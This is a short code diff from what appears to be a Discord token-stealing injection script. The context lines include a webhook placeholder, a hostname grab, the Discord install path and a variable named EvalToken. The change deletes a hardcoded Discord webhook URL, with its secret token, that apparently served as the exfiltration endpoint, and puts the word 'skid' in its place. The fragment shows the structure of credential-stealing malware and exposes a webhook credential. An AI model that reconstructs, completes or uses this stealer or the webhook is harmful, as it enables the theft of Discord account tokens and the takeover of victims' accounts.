@@ -183,7 +183,7 @@ const querystring = require('querystring')
 const os = require('os')
 var webhook = '%WEBHOOK_LINK%'
 var src =
-  'https://ptb.discord.com/api/webhooks/951523840633208982/783IKhM5GviR4AxM24qmaPuW6i4rrb0W57chxjyXrZnB7KQ2AUuzeB-7DzoNUwC2yj9W'
+  'skid'
 const computerName = os.hostname()
 const discordInstall = '' + __dirname,
   EvalToken =
